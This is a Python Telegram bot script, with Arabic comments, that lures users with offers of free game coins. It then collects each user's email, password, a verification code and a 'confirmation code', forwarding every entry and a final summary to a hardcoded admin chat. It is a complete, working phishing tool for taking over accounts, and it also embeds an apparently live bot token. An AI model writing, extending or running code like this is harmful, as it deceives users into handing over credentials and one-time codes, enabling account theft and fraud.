import telebot
from telebot import types

# التوكن بتاع البوت بتاعك
TOKEN = '8194726454:AAHh0husqxeGt-yZ-QeYNSxHVPp59B-MxxM'
bot = telebot.TeleBot(TOKEN)

# ده الـ Chat ID الخاص بيك لإرسال البيانات
ADMIN_CHAT_ID = 5748538079  # ← الـ Chat ID الخاص بك

user_state = {}
user_data = {}

def send_admin_message(chat_id, user_message, step_name):
    """
    دالة مساعدة لإرسال رسالة إلى المشرف عند كل خطوة.
    chat_id: الـ chat_id الخاص بالمستخدم الذي أرسل الرسالة.
    user_message: نص الرسالة التي أرسلها المستخدم.
    step_name: وصف الخطوة التي تم فيها استلام الرسالة.
    """
    admin_msg = (
        f"📩 **رسالة جديدة من مستخدم** 📩\n"
        f"👤 **المستخدم:** @{bot.get_chat(chat_id).username or 'بدون اسم مستخدم'} (ID: `{chat_id}`)\n"
        f"📝 **الخطوة:** {step_name}\n"
        f"💬 **الرسالة:** `{user_message}`\n"
        f"---"
    )
    try:
        bot.send_message(ADMIN_CHAT_ID, admin_msg, parse_mode='Markdown')
    except Exception as e:
        print(f"حدث خطأ أثناء إرسال الرسالة إلى المشرف: {e}")

# دالة للتعامل مع المدخلات غير الصالحة
def handle_invalid_input(message, expected_input_description, next_state):
    bot.send_message(message.chat.id, f"❌ عفواً، هذا الإدخال غير صحيح. يرجى {expected_input_description}.")
    user_state[message.chat.id] = next_state # إعادة تعيين الحالة ليتوقع نفس المدخل مرة أخرى

@bot.message_handler(commands=['start'])
def send_welcome(message):
    send_admin_message(message.chat.id, "/start", "بدء المحادثة")
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    btns = ["1000 كوينز", "2000 كوينز", "3500 كوينز", "5000 كوينز", "8000 كوينز"]
    for btn in btns:
        markup.add(types.KeyboardButton(btn))
    bot.send_message(message.chat.id, "اختر عدد الكوينز اللي عايزه👇", reply_markup=markup)
    user_state[message.chat.id] = "waiting_for_choice"

@bot.message_handler(func=lambda message: user_state.get(message.chat.id) == "waiting_for_choice")
def ask_for_email(message):
    if message.text in ["1000 كوينز", "2000 كوينز", "3500 كوينز", "5000 كوينز", "8000 كوينز"]:
        send_admin_message(message.chat.id, message.text, "اختيار الكوينز")
        user_data[message.chat.id] = {"coins": message.text}
        bot.send_message(message.chat.id, "✅ تمام، أرسل الإيميل الخاص بك:") # طلب الإيميل فقط
        user_state[message.chat.id] = "waiting_for_email" # حالة جديدة لانتظار الإيميل
    else:
        handle_invalid_input(message, "اختيار عدد الكوينز من الأزرار المتاحة", "waiting_for_choice")


@bot.message_handler(func=lambda message: user_state.get(message.chat.id) == "waiting_for_email")
def ask_for_password(message):
    # يمكن إضافة تحقق أكثر تعقيدًا هنا لعنوان البريد الإلكتروني إذا لزم الأمر
    if "@" in message.text and "." in message.text: # تحقق بسيط جداً للإيميل
        send_admin_message(message.chat.id, message.text, "إدخال الإيميل")
        user_data[message.chat.id]["email"] = message.text
        bot.send_message(message.chat.id, "✅ حسناً، الآن أرسل الباسورد الخاص بك:") # طلب الباسورد
        user_state[message.chat.id] = "waiting_for_password" # حالة جديدة لانتظار الباسورد
    else:
        handle_invalid_input(message, "إدخال إيميل صحيح", "waiting_for_email")


@bot.message_handler(func=lambda message: user_state.get(message.chat.id) == "waiting_for_password")
def ask_for_code(message):
    # في هذه المرحلة، أي نص يُعتبر كلمة مرور
    if len(message.text) > 0: # التأكد أن الباسورد ليس فارغاً
        send_admin_message(message.chat.id, message.text, "إدخال الباسورد")
        user_data[message.chat.id]["password"] = message.text
        bot.send_message(message.chat.id, "تمام ✅\nأرسل الكود:")
        user_state[message.chat.id] = "waiting_for_code"
    else:
        handle_invalid_input(message, "إدخال كلمة مرور", "waiting_for_password")


@bot.message_handler(func=lambda message: user_state.get(message.chat.id) == "waiting_for_code")
def ask_for_confirmation_code(message):
    # يمكن إضافة تحقق لكون الكود أرقام فقط إذا لزم الأمر
    if message.text.isdigit(): # التحقق من أن الكود يتكون من أرقام فقط
        send_admin_message(message.chat.id, message.text, "إدخال الكود الأول")
        user_data[message.chat.id]["code"] = message.text
        bot.send_message(message.chat.id, "أرسل كود تأكيد عملية الشحن وانتظر 5 دقائق ثم افتح اللعبة.")
        user_state[message.chat.id] = "waiting_for_confirmation_code"
    else:
        handle_invalid_input(message, "إدخال الكود (أرقام فقط)", "waiting_for_code")


@bot.message_handler(func=lambda message: user_state.get(message.chat.id) == "waiting_for_confirmation_code")
def finish_process(message):
    # يمكن إضافة تحقق لكون الكود أرقام فقط إذا لزم الأمر
    if message.text.isdigit(): # التحقق من أن الكود يتكون من أرقام فقط
        send_admin_message(message.chat.id, message.text, "إدخال كود تأكيد الشحن")
        user_data[message.chat.id]["confirmation_code"] = message.text
        
        # رسالة الملخص النهائية
        full_data = user_data[message.chat.id]
        
        msg_to_admin_summary = (
            f"✨ **ملخص بيانات شحن كاملة!** ✨\n\n"
            f"👤 **المستخدم:** @{bot.get_chat(message.chat.id).username or 'بدون اسم مستخدم'} (ID: `{message.chat.id}`)\n"
            f"💰 **الكوينز المطلوبة:** {full_data['coins']}\n"
            f"📧 **الإيميل:** `{full_data['email']}`\n" # تم فصل الإيميل
            f"🔐 **الباسورد:** `{full_data['password']}`\n" # تم فصل الباسورد
            f"🔢 **الكود الأول:** `{full_data['code']}`\n"
            f"✅ **كود تأكيد العملية:** `{full_data['confirmation_code']}`\n"
            f"---"
        )

        try:
            bot.send_message(ADMIN_CHAT_ID, msg_to_admin_summary, parse_mode='Markdown')
        except Exception as e:
            print(f"حدث خطأ أثناء إرسال رسالة الملخص للمشرف: {e}")

        bot.send_message(message.chat.id, "✅ تم استلام بياناتك بنجاح.\nيرجى الانتظار 5 دقائق ثم قم بفتح اللعبة. 🎮💰")
        
        user_state[message.chat.id] = None
        if message.chat.id in user_data:
            del user_data[message.chat.id]
    else:
        handle_invalid_input(message, "إدخال كود التأكيد (أرقام فقط)", "waiting_for_confirmation_code")


# معالج عام لأي رسالة لم يتم التقاطها بواسطة الدوال الأخرى
@bot.message_handler(func=lambda message: True)
def handle_unhandled_messages(message):
    # نتحقق إذا كان المستخدم في حالة معينة
    current_state = user_state.get(message.chat.id)
    if current_state:
        # إذا كان في حالة معينة ولكنه أرسل شيئًا غير متوقع في تلك الحالة
        bot.send_message(message.chat.id, "❌ عفواً، يبدو أنك أدخلت شيئاً غير متوقع في هذه المرحلة. يرجى اتباع التعليمات.")
        # هنا يمكننا إما إعادة توجيههم إلى الخطوة السابقة أو إعادة طلب المدخل المحدد.
        # للحفاظ على البساطة، سنطلب منه إعادة اتباع التعليمات.
        # يمكنك إضافة منطق أكثر تعقيداً هنا إذا أردت إعادة توجيهه للخطوة السابقة بناءً على current_state
    else:
        # إذا لم يكن في أي حالة معروفة (مثلاً أرسل رسالة عشوائية في البداية)
        bot.send_message(message.chat.id, "مرحباً بك! يرجى استخدام الأمر /start لبدء عملية الشحن.")
    send_admin_message(message.chat.id, message.text, f"رسالة غير متوقعة في الحالة: {current_state or 'غير محددة'}")


bot.polling()
